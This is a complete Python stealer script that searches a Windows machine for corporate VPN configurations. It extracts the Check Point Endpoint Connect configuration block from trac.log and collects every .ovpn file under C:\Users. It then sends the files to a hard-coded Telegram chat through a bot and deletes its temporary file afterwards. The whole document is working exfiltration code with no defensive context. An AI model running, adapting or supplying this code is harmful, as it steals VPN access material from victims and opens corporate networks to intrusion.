import re
import os
import asyncio
from aiogram import Bot, Dispatcher, types

TOKEN = "<BOT TOKEN>"
CHAT_ID = 123123123
LOG_FILE = r"C:\Program Files (x86)\CheckPoint\Endpoint Connect\trac.log"
CONFIG_FILE = "checkpoint_config.txt"

bot = Bot(token=TOKEN)
dp = Dispatcher(bot)

def extract_config():
    if not os.path.exists(LOG_FILE):
        return None

    try:
        with open(LOG_FILE, "r", encoding="cp1251", errors="ignore") as f:
            log_content = f.read()
    except UnicodeDecodeError:
        with open(LOG_FILE, "r", encoding="latin1", errors="ignore") as f:
            log_content = f.read()

    match = re.search(r"<CONFIGURATION>(.*?)</CONFIGURATION>", log_content, re.DOTALL)
    if match:
        raw_config = match.group(1).strip()
        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
            f.write(raw_config)
        return CONFIG_FILE

    return None

def find_vpn_configs():
    found_files = []
    for root, _, files in os.walk("C:\\Users\\"):
        for file in files:
            if file.endswith(".ovpn"):
                found_files.append(os.path.join(root, file))

    return found_files

async def send_files(files):
    for file in files:
        try:
            await bot.send_document(CHAT_ID, document=types.InputFile(file))
        except Exception:
            pass

async def send_config():
    config_path = extract_config()
    vpn_files = find_vpn_configs()
    
    if config_path:
        await bot.send_message(CHAT_ID, f"[+] CheckPoint Configuration File Found, sending...")
        await bot.send_document(CHAT_ID, document=types.InputFile(config_path))
    else:
        await bot.send_message(CHAT_ID, "[!] Corporate VPN config (CheckPoint, GlobalProtect) not found.")
    
    if vpn_files:
        await bot.send_message(CHAT_ID, f"[+] Found {len(vpn_files)} OVPN configs, sending...")
        await send_files(vpn_files)
    else:
        await bot.send_message(CHAT_ID, "[!] OVPN configs not found")

    await bot.session.close()

async def main():
    await send_config()
    os.remove(CONFIG_FILE)
    exit()

if __name__ == "__main__":
    asyncio.run(main())
